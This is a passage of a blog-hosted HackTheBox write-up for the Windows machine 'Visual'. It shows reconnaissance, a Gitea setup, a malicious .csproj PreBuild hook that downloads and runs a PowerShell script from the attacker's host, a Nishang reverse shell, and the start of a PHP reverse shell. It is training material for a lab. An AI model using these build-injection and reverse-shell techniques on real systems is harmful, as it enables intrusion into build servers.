<!doctype html><html lang=en><head><title>'Visual' Machine HTB WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="'Visual' HTB Machine WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="'Visual' Machine HTB WriteUp"><meta name=twitter:description content="'Visual' HTB Machine WriteUp"><meta property="og:title" content="'Visual' Machine HTB WriteUp"><meta property="og:description" content="'Visual' HTB Machine WriteUp"><meta property="og:type" content="article"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/visual/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-24T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-24T00:00:00+00:00"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/visual/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/pentesting/images/favicon.svg sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/visual/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/visual/>'Visual' Machine HTB WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-02-24T00:00:00Z>24 February, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
15-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/pivoting/>pivoting</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/visual-studio/>visual studio</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/juicypotato/>juicypotato</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/powershell/>powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/godpotato/>godpotato</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/fullpowers/>fullpowers</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/privilege-escalation/>privilege escalation</a></span></div></div></header><div class=post-content><hr><h1 id=visual-machine----hackthebox>&lsquo;Visual&rsquo; Machine &ndash; HackTheBox
<a class=heading-link href=#visual-machine----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img src=/pentesting/images/Visual_avatar.png alt="&lsquo;Visual&rsquo; Avatar"></p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> scan only shows 1 port open: <code>80</code> <code>HTTP</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo nmap -sVC -p80 10.10.11.234 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 19:36 -03
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.234
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.16s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Visual - Revolutionizing Visual Studio Builds
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
</span></span></span></code></pre></div><ul><li>Visiting this site we can see the following:
<img src=/pentesting/images/Visual_1.png alt="Visual 1"></li><li>The site apparently builds, from source, codes for <code>Visual Studio</code>. The only think we can add as a user is a <code>Git</code> repository:
<img src=/pentesting/images/Visual_2.png alt="Visual 2"></li><li>To check how it works, we can start a simple <code>netcat</code> listener on port <code>3000</code> (the default port for <code>Gitea</code>, just in case a firewall is preventing connection from other ports).</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nc -lvnp 3000
</span></span></span></code></pre></div><p>and in the website I pass my attacker IP with some random <code>.git</code> file, just to test how it works:
<img src=/pentesting/images/Visual_3.png alt="Visual 3"></p><p>where <code>10.10.16.6</code> is my attacker IP.</p><ul><li>After some seconds after passing the url, in the <code>netcat</code> listener I get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nc -lvnp 3000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 3000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.234] 49671
</span></span></span><span class=line><span class=cl><span class=go>GET /info/refs?service=git-upload-pack HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.6:3000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: git/2.41.0.windows.1
</span></span></span><span class=line><span class=cl><span class=go>Accept: */*
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: deflate, gzip, br, zstd
</span></span></span><span class=line><span class=cl><span class=go>Pragma: no-cache
</span></span></span><span class=line><span class=cl><span class=go>Git-Protocol: version=2
</span></span></span></code></pre></div><ul><li>Since I don&rsquo;t see <code>testing.git</code> anywhere in the request I might not be able to inject code, so I discard that. Also, based on <a href=https://git-scm.com/docs/git-clone class=external-link target=_blank rel=noopener>Git documentation</a> this is just how cloning a repository works.</li><li>To emulate a custom repository I will use <code>Gitea</code> with <code>Docker</code>. Assuming that we have <code>Docker</code> installed in our machine (I use Kali Linux so I followed <a href=https://www.kali.org/docs/containers/installing-docker-on-kali/ class=external-link target=_blank rel=noopener>these steps</a>), first start <code>Docker</code> service:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo systemctl start docker
</span></span></span></code></pre></div><p>Check if it is running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo systemctl status docker
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚óè docker.service - Docker Application Container Engine
</span></span></span><span class=line><span class=cl><span class=go>     Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; preset: enabled)
</span></span></span><span class=line><span class=cl><span class=go>     Active: active (running) since Wed 2024-02-21 20:02:04 -03; 1min 6s ago
</span></span></span><span class=line><span class=cl><span class=go>TriggeredBy: ‚óè docker.socket
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Download the images:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo docker pull gitea/gitea
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default tag: latest
</span></span></span><span class=line><span class=cl><span class=go>latest: Pulling from gitea/gitea
</span></span></span><span class=line><span class=cl><span class=go>619be1103602: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>172dd90f8cd3: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>e351dffe3e2e: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>23115583656f: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>29191722a758: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>365242e44775: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>2b8d3024c169: Pull complete
</span></span></span><span class=line><span class=cl><span class=go>Digest: sha256:a2095ce71c414c0c6a79192f3933e668a595f7fa7706324edd0aa25c8728f00f
</span></span></span><span class=line><span class=cl><span class=go>Status: Downloaded newer image for gitea/gitea:latest
</span></span></span><span class=line><span class=cl><span class=go>docker.io/gitea/gitea:latest
</span></span></span></code></pre></div><p>Check if the container has been downloaded and is detected by <code>Docker</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>sudo docker images
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
</span></span></span><span class=line><span class=cl><span class=go>gitea/gitea   latest    bf95d9a45ce4   2 weeks ago   160MB
</span></span></span></code></pre></div><p>And, finally, start the service:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>docker run -d -p 127.0.0.1:3000:3000 -p 10.10.16.6:3000:3000 --name gitea-container gitea/gitea:latest
</span></span></span></code></pre></div><p>so I start the service in both services: <code>localhost</code> and on my public <code>tun0</code> network IPv4 address (the one from HackTheBox), so the target machine can have connectivity to my machine.</p><ul><li>If this worked, now we should have <code>Gitea</code> running on our <code>localhost</code> on port <code>3000</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>lsof -i:3000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>COMMAND     PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
</span></span></span><span class=line><span class=cl><span class=go>firefox-e 25194 gunzf0x   82u  IPv4  98328      0t0  TCP localhost:44248-&gt;localhost:3000 (ESTABLISHED)
</span></span></span></code></pre></div><ul><li>We can use our web browser to visit <code>http://localhost:3000</code> or <code>http://10.10.16.6:3000</code> (my attacker IPv4 address) and see that <code>Gitea</code> is running. I recommend you to leave everything by default. <em>Note</em>: If you use a different <code>SQL</code> database than the one that comes by default (<code>SQLite</code>) the service might present some problems.</li><li>We can now register with a username and log in with that username in <code>Gitea</code> service</li><li>If everything worked we should have a site like this:
<img src=/pentesting/images/Visual_4.png alt="Bisual 4"></li><li>I will recreate an already existing repository. I clone <a href=https://github.com/rushakh/copy-pasting-machine class=external-link target=_blank rel=noopener>this repository</a> on my machine (which is a simple <code>C#</code> random project I have chosen from Github):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>git clone https://github.com/rushakh/copy-pasting-machine.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;copy-pasting-machine&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 22, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (22/22), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (21/21), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 22 (delta 2), reused 18 (delta 1), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (22/22), 17.39 KiB | 301.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2/2), done.
</span></span></span></code></pre></div><ul><li>On <code>Gitea</code>, create a new repository clicking on the <code>+</code> symbol at the top right, and then on <code>New Repository</code>:
<img src=/pentesting/images/Visual_5.png alt="Visual 5">
and we should have something like this:
<img src=/pentesting/images/Visual_6.png alt="Visual 6">
<em>Note</em>: Here I decided to rename the repository from <code>testing</code> to <code>copy-pasting-machine</code> to avoid conflict between the cloned repository and my <code>Gitea</code> repository since we will need to &ldquo;build&rdquo; the files as we will see later.</li><li>I create a directory called <code>gitea-repo</code>, enter in that directory and follow the instructions from <code>Creating a new repository on the command line</code> to add files</li><li>Then copy everything inside this cloned repo (the original <code>copy-pasting-machines</code> repository), except the <code>.git</code> folder, and past it to <code>gitea-repo</code> directory (the directory containing <code>copy-pasting-machine.git</code> repo files)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>cd gitea_repo/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ls -la
</span></span></span><span class=line><span class=cl><span class=go>total 20
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x 4096 Feb 21 22:03  .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x 4096 Feb 21 22:02  ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 1124 Feb 21 22:03  CopyPasteMachine.sln
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 8 gunzf0x gunzf0x 4096 Feb 21 22:04  .git
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    0 Feb 21 22:01  README.md
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 Feb 21 22:03 &#39;trying media&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ git add .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ cat .git/config
</span></span></span><span class=line><span class=cl><span class=go>[core]
</span></span></span><span class=line><span class=cl><span class=go>        repositoryformatversion = 0
</span></span></span><span class=line><span class=cl><span class=go>        filemode = true
</span></span></span><span class=line><span class=cl><span class=go>        bare = false
</span></span></span><span class=line><span class=cl><span class=go>        logallrefupdates = true
</span></span></span><span class=line><span class=cl><span class=go>[remote &#34;origin&#34;]
</span></span></span><span class=line><span class=cl><span class=go>        url = http://localhost:3000/gunzf0x/copy-pasting-machine.git
</span></span></span><span class=line><span class=cl><span class=go>        fetch = +refs/heads/*:refs/remotes/origin/*
</span></span></span><span class=line><span class=cl><span class=go>[branch &#34;main&#34;]
</span></span></span><span class=line><span class=cl><span class=go>        remote = origin
</span></span></span><span class=line><span class=cl><span class=go>        merge = refs/heads/main
</span></span></span></code></pre></div><p>And commit and push all the new files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>git commit -m &#34;Cloning repo&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>git push origin main
</span></span></span></code></pre></div><ul><li>Now our repository in <code>Gitea</code> should look like this:
<img src=/pentesting/images/Visual_7.png alt="Visual 7"></li><li>Now, back to the <code>HTTP</code> website in <code>Submit Your Repo</code> I past the link: <code>http://10.10.16.6:3000/gunzf0x/copy-pasting-machine.git</code></li><li>After some time, the site builds my files:
<img src=/pentesting/images/Visual_8.png alt="Visual 8 - building executable"></li><li>I note that when the repository does not have a <code>.sln</code> file it fails.</li><li>Also if we check <a href="https://learn.microsoft.com/en-us/cpp/build/how-to-use-build-events-in-msbuild-projects?view=msvc-170" class=external-link target=_blank rel=noopener>how files are built in MSBuild Projects</a> we can see that it is possible to inject commands. A simple malicious <code>.csproj</code> file would look like:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-csproj data-lang=csproj><span class=line><span class=cl><span class=nt>&lt;Project</span> <span class=na>Sdk=</span><span class=s>&#34;Microsoft.NET.Sdk&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;PropertyGroup&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;OutputType&gt;</span>Exe<span class=nt>&lt;/OutputType&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;TargetFramework&gt;</span>net7.0<span class=nt>&lt;/TargetFramework&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;RootNamespace&gt;</span>project_name<span class=nt>&lt;/RootNamespace&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;ImplicitUsings&gt;</span>enable<span class=nt>&lt;/ImplicitUsings&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;Nullable&gt;</span>enable<span class=nt>&lt;/Nullable&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/PropertyGroup&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;Target</span> <span class=na>Name=</span><span class=s>&#34;PreBuild&#34;</span> <span class=na>BeforeTargets=</span><span class=s>&#34;PreBuildEvent&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;Exec</span> <span class=na>Command=</span><span class=s>&#34;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.16:80/rev.ps1&#39;)&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/Target&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>&lt;/Project&gt;</span>
</span></span></code></pre></div><p>where <code>10.10.16.6</code> is my attacker IP and <code>rev.ps1</code> a <code>Powershell</code> script.</p><ul><li>In my case I will use <code>Invoke-PowerShellTcp.ps1</code> from <code>Nishang</code>, that can be downloaded <a href=https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 class=external-link target=_blank rel=noopener>here</a></li><li>I edit <code>Invoke-PowerShellTcp.ps1</code>, which I will rename as <code>rev.ps1</code>, in a text editor and add at the end of the file the following:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl>        <span class=nb>Write-Warning</span> <span class=s2>&#34;Something went wrong! Check if the server is reachable and you are using the correct port.&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>Write-Error</span> <span class=nv>$_</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Invoke-PowerShellTcp</span> <span class=n>-Reverse</span> <span class=n>-IPAddress</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>16</span><span class=p>.</span><span class=py>6</span> <span class=n>-Port</span> <span class=mf>443</span>
</span></span></code></pre></div><p>so the server will execute a reverse shell instantly when the request is made by the <code>.csproj</code> file.</p><ul><li>I create a backup file for the original <code>.csproj</code> file, just in case this fails. This file is located, in the repository I cloned, within the directory <code>trying media</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>cd trying\ media
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cp CopyPasteMachine.csproj CopyPasteMachine_backup.csproj
</span></span></span></code></pre></div><p>and then modify <code>CopyPasteMachine.csproj</code> with the malicious <code>.csproj</code> script above. I submit the changes to the <code>Gitea</code> repo.</p><ul><li>I start a <code>Python</code> <code>HTTP</code> server on port <code>80</code>, in the same directory where <code>rev.ps1</code> is located, and in another panel/terminal I start a <code>nc</code> listener on port <code>443</code>. In the webpage I finally submit the repo <code>Submit Your Repo</code> with the link <code>http://10.10.16.6:3000/gunzf0x/copy-pasting-machine.git</code>, but with the malicious <code>csproj</code> file and obtain a reverse shell:
<img src=/pentesting/images/Visual_9.png alt="Visual 9 - reverse shell">
We can get the user flag on user&rsquo;s desktop.</li></ul><h2 id=nt-authoritysystem---administrator>NT Authority\System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>We are logged in as user <code>visual\enox</code>. Looking for my privileges:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Windows\Temp\8f8177df5fbf8e4d3d0385b74ece7f\trying media&gt; whoami /priv
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PRIVILEGES INFORMATION
</span></span></span><span class=line><span class=cl><span class=go>----------------------
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Privilege Name                Description                    State
</span></span></span><span class=line><span class=cl><span class=go>============================= ============================== ========
</span></span></span><span class=line><span class=cl><span class=go>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeCreateGlobalPrivilege       Create global objects          Enabled
</span></span></span><span class=line><span class=cl><span class=go>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</span></span></span><span class=line><span class=cl><span class=go>PS C:\Windows\Temp\8f8177df5fbf8e4d3d0385b74ece7f\trying media&gt;
</span></span></span></code></pre></div><p>I cannot see something interesting</p><ul><li>I uploaded <code>Sherlock.ps1</code> (which can be downloaded from <a href=https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1 class=external-link target=_blank rel=noopener>its Github repository</a>), but did not detect any exploit.</li><li>Now, usually webservers have the <code>SeImpersonatePrivilege</code> privilege (or we can try to enable it). However, at the moment we are the user <code>visual\enox</code>. For this reason I upload the following <code>PHP</code> reverse shell and attempt to get another connection, but this time from the webserver user itself. So we do this to change/pivot to another user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// Copyright (c) 2020 Ivan ≈†incek
</span></span></span><span class=line><span class=cl><span class=c1>// v2.6
</span></span></span><span class=line><span class=cl><span class=c1>// Requires PHP v5.0.0 or greater.
</span></span></span><span class=line><span class=cl><span class=c1>// Works on Linux OS, macOS, and Windows OS.
</span></span></span><span class=line><span class=cl><span class=c1>// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>Shell</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$addr</span>  <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$port</span>  <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$os</span>    <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$shell</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$descriptorspec</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>),</span> <span class=c1>// shell can read from STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>1</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>),</span> <span class=c1>// shell can write to STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>2</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;pipe&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>  <span class=c1>// shell can write to STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$buffer</span> <span class=o>=</span> <span class=mi>1024</span><span class=p>;</span>  <span class=c1>// read/write buffer size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$clen</span>   <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>     <span class=c1>// command length
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$error</span>  <span class=o>=</span> <span class=k>false</span><span class=p>;</span> <span class=c1>// stream read/write error
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$sdump</span>  <span class=o>=</span> <span class=k>true</span><span class=p>;</span>  <span class=c1>// script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$addr</span><span class=p>,</span> <span class=nv>$port</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addr</span> <span class=o>=</span> <span class=nv>$addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>port</span> <span class=o>=</span> <span class=nv>$port</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>detect</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$detected</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$os</span> <span class=o>=</span> <span class=k>PHP_OS</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;LINUX&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;DARWIN&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span>    <span class=o>=</span> <span class=s1>&#39;LINUX&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>shell</span> <span class=o>=</span> <span class=s1>&#39;/bin/sh&#39;</span><span class=p>;</span>
